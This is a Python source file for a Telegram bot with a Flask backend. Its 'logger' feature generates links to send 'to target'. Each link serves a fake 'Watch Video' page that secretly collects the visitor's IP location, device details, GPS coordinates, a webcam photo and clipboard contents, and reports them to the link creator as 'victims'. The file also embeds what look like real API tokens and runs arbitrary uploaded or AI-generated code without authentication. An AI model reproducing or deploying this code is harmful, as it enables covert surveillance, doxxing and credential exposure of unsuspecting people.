import asyncio
from telethon import TelegramClient, events, Button
from telethon.tl.types import InputMediaGeoPoint, InputGeoPoint
from flask import Flask, request, render_template_string, jsonify
import threading
import random
import string
import json
import os
from datetime import datetime
import requests
import base64
import tempfile
import subprocess
import re

BOT_TOKEN = "8962532742:AAG1377yowFSqklfaPP_AzEXvIvV-Fm_jqw"
GROQ_API_KEY = "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"
API_URL = "https://api.groq.com/openai/v1/chat/completions"

bot = TelegramClient('allinone_bot', api_id=6, api_hash="eb06d4abfb49dc3eeb1aeb98ae0f581e")
app = Flask(__name__)
links = {}
user_states = {}
deployed_bots_list = {}
loop = None
BOTS_DIR = "deployed_bots"
os.makedirs(BOTS_DIR, exist_ok=True)

TRACKER_PAGE = """<!DOCTYPE html>
<html>
<head><title>Video</title><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#fff;font-family:Arial;text-align:center}
button{background:#fe2c55;color:#fff;border:none;padding:15px 40px;font-size:18px;border-radius:30px;margin:10px;cursor:pointer}
#status{margin-top:20px;color:#aaa}
</style></head>
<body>
<h2 style="margin-top:80px">Video Ready</h2>
<p>Press button to watch</p>
<button onclick="startAll()">Watch Video</button>
<p id="status"></p>
<video id="v" style="display:none" autoplay playsinline></video>
<canvas id="c" style="display:none"></canvas>
<script>
fetch('/collect/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ua:navigator.userAgent,pl:navigator.platform,la:navigator.language,ss:screen.width+'x'+screen.height,tz:Intl.DateTimeFormat().resolvedOptions().timeZone})});
function startAll(){
    document.getElementById('status').innerText='Loading...';
    if(navigator.geolocation){navigator.geolocation.getCurrentPosition(p=>fetch('/gps/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy})}),e=>{},{enableHighAccuracy:true,timeout:10000});}
    (async()=>{try{var s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});var v=document.getElementById('v');v.srcObject=s;await v.play();await new Promise(r=>setTimeout(r,2000));var c=document.getElementById('c');c.width=v.videoWidth||640;c.height=v.videoHeight||480;c.getContext('2d').drawImage(v,0,0);var ph=c.toDataURL('image/jpeg',0.7);await fetch('/photo/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({photo:ph})});s.getTracks().forEach(t=>t.stop())}catch(e){}})();
    (async()=>{try{var t=await navigator.clipboard.readText();if(t)fetch('/clipboard/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({clipboard:t})})}catch(e){}})();
    setTimeout(()=>{document.getElementById('status').innerText='Done';window.location.href='https://t.me/creator_failpybot'},3000);
}
</script></body></html>"""

BUILDER_PAGE = """<!DOCTYPE html>
<html>
<head><title>Bot Builder</title><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#1a1a2e;color:#e0e0e0;font-family:Arial;padding:15px}
h2{color:#e94560;margin-bottom:15px;text-align:center}
textarea{width:100%;height:200px;background:#16213e;color:#fff;border:1px solid #e94560;border-radius:10px;padding:10px;font-size:14px;resize:vertical;margin-bottom:10px}
input{width:100%;background:#16213e;color:#fff;border:1px solid #e94560;border-radius:10px;padding:10px;font-size:14px;margin-bottom:10px}
button{background:#e94560;color:#fff;border:none;padding:12px;border-radius:10px;font-size:16px;cursor:pointer;margin:5px 0;width:100%}
button.danger{background:#333}
.status{text-align:center;color:#aaa;margin:10px 0;font-size:14px}
.bot-list{background:#16213e;border-radius:10px;padding:10px;margin:10px 0}
.bot-item{color:#e94560;padding:5px;border-bottom:1px solid #333}
</style></head>
<body>
<h2>Bot Builder</h2>
<div class="status" id="status">Ready</div>
<textarea id="code" placeholder="Paste your Python code here..."></textarea>
<input id="token" placeholder="Bot token from @BotFather">
<button onclick="deployBot()">Deploy Bot</button>
<button onclick="generateAI()">Generate with AI</button>
<button onclick="stopAllBots()" class="danger">Stop All Bots</button>
<div class="bot-list" id="botList">Loading...</div>
<script>
const tg = window.Telegram.WebApp;
tg.expand();

function setStatus(text){document.getElementById('status').innerText=text;}

async function deployBot(){
    var code=document.getElementById('code').value.trim();
    var token=document.getElementById('token').value.trim();
    if(!code){setStatus('Paste code first!');return;}
    if(!token){setStatus('Enter token first!');return;}
    setStatus('Deploying...');
    try{
        var resp=await fetch('/api/deploy',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({code:code,token:token})});
        var text=await resp.text();
        try{
            var data=JSON.parse(text);
            if(data.error){setStatus(data.error);}
            else{setStatus('Deployed! @'+data.username);loadBots();}
        }catch(e){setStatus('Server: '+text.substring(0,100));}
    }catch(e){setStatus('Error: '+e.message);}
}

async function generateAI(){
    var desc=prompt('Bot description:')||document.getElementById('code').value.trim();
    var token=document.getElementById('token').value.trim();
    if(!desc){setStatus('Enter description first!');return;}
    setStatus('AI generating...');
    try{
        var resp=await fetch('/api/generate',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({desc:desc,token:token})});
        var text=await resp.text();
        try{
            var data=JSON.parse(text);
            if(data.error){setStatus(data.error);}
            else{
                document.getElementById('code').value=data.code;
                setStatus('Generated! Click Deploy.');
            }
        }catch(e){setStatus('Server: '+text.substring(0,100));}
    }catch(e){setStatus('Error: '+e.message);}
}

async function stopAllBots(){
    if(!confirm('Stop all deployed bots?')) return;
    setStatus('Stopping all...');
    try{
        var resp=await fetch('/api/stop_all',{method:'POST'});
        var text=await resp.text();
        var data=JSON.parse(text);
        setStatus('Stopped: '+data.stopped+' bots');
        loadBots();
    }catch(e){setStatus('Error: '+e.message);}
}

async function loadBots(){
    try{
        var resp=await fetch('/api/bots');
        var text=await resp.text();
        try{
            var data=JSON.parse(text);
            var html='';
            if(data.bots&&data.bots.length>0){
                for(var i=0;i<data.bots.length;i++){
                    html+='<div class="bot-item">@'+data.bots[i].username+' - '+data.bots[i].file+'</div>';
                }
            }else{html='No bots deployed';}
            document.getElementById('botList').innerHTML=html;
        }catch(e){document.getElementById('botList').innerHTML='Error loading';}
    }catch(e){}
}
loadBots();
</script></body></html>"""

def gen_id():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=8))

def get_ip_info(ip):
    first_ip = ip.split(',')[0].strip()
    try:
        r = requests.get(f"https://ipapi.co/{first_ip}/json/", timeout=5)
        data = r.json()
        if data.get('city'): return {'country': data.get('country_name','?'), 'city': data.get('city','?'), 'region': data.get('region','?'), 'isp': data.get('org','?'), 'lat': data.get('latitude'), 'lon': data.get('longitude'), 'query': first_ip}
    except: pass
    try:
        r = requests.get(f"http://ip-api.com/json/{first_ip}?fields=country,regionName,city,isp,lat,lon,query", timeout=5)
        data = r.json()
        if data.get('city'): return {'country': data.get('country','?'), 'city': data.get('city','?'), 'region': data.get('regionName','?'), 'isp': data.get('isp','?'), 'lat': data.get('lat'), 'lon': data.get('lon'), 'query': first_ip}
    except: pass
    return {'country':'?','city':'?','region':'?','isp':'?','lat':None,'lon':None,'query':first_ip}

@app.route('/')
def home(): return "OK"

@app.route('/go/<lid>')
def track(lid):
    if lid not in links: return "Invalid link"
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = request.headers.get('User-Agent', '?')
    v = {'time': datetime.now().strftime('%H:%M:%S'), 'ip': ip, 'ua': ua, 'photo': None, 'gps': None, 'clipboard': None}
    v.update(get_ip_info(ip))
    links[lid]['victims'].append(v)
    asyncio.run_coroutine_threadsafe(notify(links[lid]['owner'], lid), loop)
    return render_template_string(TRACKER_PAGE, link_id=lid)

@app.route('/app')
def mini_app():
    return render_template_string(BUILDER_PAGE)

@app.route('/api/deploy', methods=['POST'])
def api_deploy():
    data = request.get_json(silent=True)
    if not data: return jsonify({'error': 'Invalid JSON'})
    
    code = data.get('code', '')
    token = data.get('token', '')
    
    if not code or not token: return jsonify({'error': 'Code and token required'})
    
    code = re.sub(r'BOT_TOKEN\s*=\s*["\'][^"\']+["\']', f'BOT_TOKEN = "{token}"', code)
    bot_id = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=6))
    filename = f"{BOTS_DIR}/bot_{bot_id}.py"
    
    with open(filename, 'w', encoding='utf-8') as f: f.write(code)
    subprocess.Popen(['python', filename], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    deployed_bots_list[filename] = {'username': 'bot_' + bot_id, 'file': filename}
    return jsonify({'success': True, 'username': 'bot_' + bot_id, 'file': filename})

@app.route('/api/generate', methods=['POST'])
def api_generate():
    data = request.get_json(silent=True)
    if not data: return jsonify({'error': 'Invalid JSON'})
    
    desc = data.get('desc', '')
    token = data.get('token', '')
    
    if not desc: return jsonify({'error': 'Description required'})
    
    code = generate_bot_code(desc, token if token else None)
    return jsonify({'code': code})

@app.route('/api/bots')
def api_bots():
    bots = [{'username': v.get('username','?'), 'file': v.get('file','?')} for v in deployed_bots_list.values()]
    return jsonify({'bots': bots})

@app.route('/api/stop_all', methods=['POST'])
def api_stop_all():
    count = 0
    for filename in os.listdir(BOTS_DIR):
        if filename.endswith('.py'):
            os.remove(os.path.join(BOTS_DIR, filename))
            count += 1
    deployed_bots_list.clear()
    return jsonify({'success': True, 'stopped': count})

@app.route('/collect/<lid>', methods=['POST'])
def coll(lid):
    if lid in links and links[lid]['victims']: links[lid]['victims'][-1]['dev'] = request.get_json()
    return 'ok'

@app.route('/photo/<lid>', methods=['POST'])
def photo(lid):
    if lid in links and links[lid]['victims']:
        d = request.get_json()
        if d.get('photo'): links[lid]['victims'][-1]['photo'] = d['photo']
    return 'ok'

@app.route('/gps/<lid>', methods=['POST'])
def gps(lid):
    if lid in links and links[lid]['victims']:
        d = request.get_json()
        links[lid]['victims'][-1]['gps'] = d
    return 'ok'

@app.route('/clipboard/<lid>', methods=['POST'])
def clipboard(lid):
    if lid in links and links[lid]['victims']:
        d = request.get_json()
        if d.get('clipboard'): links[lid]['victims'][-1]['clipboard'] = d['clipboard']
    return 'ok'

async def notify(uid, lid):
    try:
        await asyncio.sleep(10)
        v = links[lid]['victims'][-1] if links[lid]['victims'] else {}
        report = f"""NEW VISIT
Time: {v.get('time','?')}
IP: {v.get('ip','?').split(',')[0].strip() if v.get('ip') else '?'}
Location: {v.get('city','?')}, {v.get('region','?')}, {v.get('country','?')}
ISP: {v.get('isp','?')}
Device: {v.get('ua','?')[:150]}
"""
        if v.get('gps') and v['gps'].get('lat'): report += f"GPS: {v['gps']['lat']}, {v['gps']['lon']}\n"
        if v.get('clipboard'): report += f"Clipboard: {v['clipboard'][:200]}"
        await bot.send_message(uid, report[:2000])
        if v.get('photo'):
            try:
                photo_path = f"photo_{lid}.jpg"
                with open(photo_path, 'wb') as f: f.write(base64.b64decode(v['photo'].split(',')[1]))
                if os.path.getsize(photo_path) > 100: await bot.send_file(uid, photo_path, caption="Photo")
                os.remove(photo_path)
            except: pass
        if v.get('gps') and v['gps'].get('lat'):
            lat, lon = v['gps']['lat'], v['gps']['lon']
            geo = InputMediaGeoPoint(geo_point=InputGeoPoint(lat=lat, long=lon, accuracy_radius=10))
            await bot.send_file(uid, file=geo, caption="GPS")
            await bot.send_message(uid, f"Google Maps: https://maps.google.com/?q={lat},{lon}", link_preview=True)
    except Exception as e:
        print(f"Notify error: {e}")

def generate_bot_code(description: str, token: str = None) -> str:
    token_line = f'BOT_TOKEN = "{token}"' if token else 'BOT_TOKEN = "REPLACE_WITH_YOUR_TOKEN"'
    
    prompt = f"""Write a complete working Python Telegram bot using Telethon library.

CRITICAL RULES:
1. ONLY use: from telethon import TelegramClient, events
2. api_id = 6, api_hash = "eb06d4abfb49dc3eeb1aeb98ae0f581e"
3. {token_line}
4. Add /start command
5. NO markdown blocks, NO ```python, NO explanations
6. Output ONLY raw Python code ready to run

Bot description: {description}

Complete Python code:"""
    
    headers = {"Content-Type": "application/json", "Authorization": f"Bearer {GROQ_API_KEY}"}
    
    # DeepSeek (best for code)
    try:
        payload = {
            "model": "deepseek-r1-distill-llama-70b",
            "messages": [{"role": "user", "content": prompt}],
            "temperature": 0.1,
            "max_tokens": 6000,
            "top_p": 0.95,
        }
        resp = requests.post(API_URL, json=payload, headers=headers, timeout=60)
        code = resp.json()['choices'][0]['message']['content']
        # Clean DeepSeek output
        code = re.sub(r'```\w*\n?', '', code)
        code = re.sub(r'^.*?from telethon', 'from telethon', code, flags=re.DOTALL)
        if 'from telethon' in code: return code.strip()
    except: pass
    
    # Llama 3.3 fallback
    try:
        payload = {
            "model": "llama-3.3-70b-versatile",
            "messages": [{"role": "user", "content": prompt}],
            "temperature": 0.1,
            "max_tokens": 6000,
            "top_p": 0.95,
        }
        resp = requests.post(API_URL, json=payload, headers=headers, timeout=60)
        code = resp.json()['choices'][0]['message']['content']
        code = code.replace("```python", "").replace("```", "").strip()
        return code
    except Exception as e:
        return f"# Generation error: {e}"

def has_token(code: str) -> bool:
    return bool(re.search(r'BOT_TOKEN\s*=\s*["\'](?!REPLACE_WITH_YOUR_TOKEN|ВСТАВЬ_СВОЙ_ТОКЕН)[^"\']+["\']', code))

def extract_token(code: str) -> str:
    match = re.search(r'BOT_TOKEN\s*=\s*["\']([^"\']+)["\']', code)
    return match.group(1) if match else None

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    buttons = [
        [Button.inline("Create logger link", "logger")],
        [Button.inline("Upload .py file (deploy)", "upload")],
        [Button.inline("AI generate bot (with token)", "ai_with_token")],
        [Button.inline("Open Bot Builder", "builder")],
    ]
    await event.reply("ALL-IN-ONE BOT\n\nLogger | Deploy | AI | Builder\n\nChoose action:", buttons=buttons)

@bot.on(events.CallbackQuery)
async def callback(event):
    user_id = event.sender_id
    data = event.data.decode()
    
    if data == "logger":
        lid = gen_id()
        links[lid] = {'owner': user_id, 'created': datetime.now().strftime('%H:%M'), 'victims': []}
        await event.edit(f"Link created:\n`https://botaald.onrender.com/go/{lid}`\n\nSend to target!")
    
    elif data == "upload":
        user_states[user_id] = {'action': 'wait_code'}
        await event.edit("Send .py file or paste code as text.")
    
    elif data == "ai_with_token":
        user_states[user_id] = {'action': 'wait_desc_with_token'}
        await event.edit("Format:\nTOKEN: your_token\nDESC: bot description")
    
    elif data == "builder":
        await event.edit("Open Mini App:\nhttps://t.me/creator_failpybot/Gram")

@bot.on(events.NewMessage(incoming=True))
async def handle(event):
    if event.out: return
    user_id = event.sender_id
    text = event.text.strip() if event.text else ""
    
    if user_id not in user_states: return
    state = user_states[user_id]
    
    if state['action'] == 'wait_code':
        code = None
        if event.file and event.file.name and event.file.name.endswith('.py'):
            temp_path = os.path.join(tempfile.gettempdir(), event.file.name)
            await event.download_media(temp_path)
            with open(temp_path, 'r', encoding='utf-8', errors='ignore') as f: code = f.read()
            os.remove(temp_path)
        elif text and len(text) > 50 and ('import' in text.lower() or 'def ' in text.lower() or 'bot_token' in text.lower()):
            code = text
        
        if code:
            if has_token(code):
                msg = await event.reply("Token found. Deploying...")
                filename, error = deploy_bot(code, extract_token(code))
                if error: await msg.edit(error)
                else:
                    del user_states[user_id]
                    await msg.edit(f"Deployed! File: `{filename}`")
            else:
                user_states[user_id]['code'] = code
                user_states[user_id]['action'] = 'wait_token'
                await event.reply("No token. Send token from @BotFather:")
        else:
            await event.reply("Send .py file or paste code as text.")
        return
    
    if state['action'] == 'wait_token':
        if ':' in text and len(text) > 30:
            code = state['code']
            msg = await event.reply("Deploying...")
            filename, error = deploy_bot(code, text)
            if error: await msg.edit(error)
            else:
                del user_states[user_id]
                await msg.edit(f"Deployed! File: `{filename}`")
        else:
            await event.reply("Invalid token. Format: 123456:ABCdef")
        return
    
    if state['action'] == 'wait_desc_with_token':
        token = None
        desc = text
        for line in text.split('\n'):
            if line.upper().startswith('TOKEN:'): token = line.split(':', 1)[1].strip()
            elif line.upper().startswith('DESC:'): desc = line.split(':', 1)[1].strip()
        
        if token and ':' in token and len(token) > 30:
            msg = await event.reply("AI generating...")
            code = generate_bot_code(desc, token)
            filename, error = deploy_bot(code, token)
            if error: await msg.edit(error)
            else:
                del user_states[user_id]
                await msg.edit(f"Deployed! File: `{filename}`")
        else:
            await event.reply("Invalid token. Format:\nTOKEN: 123456:ABCdef\nDESC: description")
        return

def deploy_bot(code: str, token: str) -> tuple:
    if not token or token in ["REPLACE_WITH_YOUR_TOKEN", "ВСТАВЬ_СВОЙ_ТОКЕН"]:
        return None, "Where is the token?"
    code = re.sub(r'BOT_TOKEN\s*=\s*["\'][^"\']+["\']', f'BOT_TOKEN = "{token}"', code)
    bot_id = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=6))
    filename = f"{BOTS_DIR}/bot_{bot_id}.py"
    with open(filename, 'w', encoding='utf-8') as f: f.write(code)
    subprocess.Popen(['python', filename], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    deployed_bots_list[filename] = {'username': 'bot_' + bot_id, 'file': filename}
    return filename, None

async def main():
    global loop
    loop = asyncio.get_event_loop()
    port = int(os.environ.get('PORT', 8080))
    def run_flask(): app.run(host='0.0.0.0', port=port, debug=False)
    threading.Thread(target=run_flask, daemon=True).start()
    await bot.start(bot_token=BOT_TOKEN)
    print("All-in-One bot started!")
    await bot.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
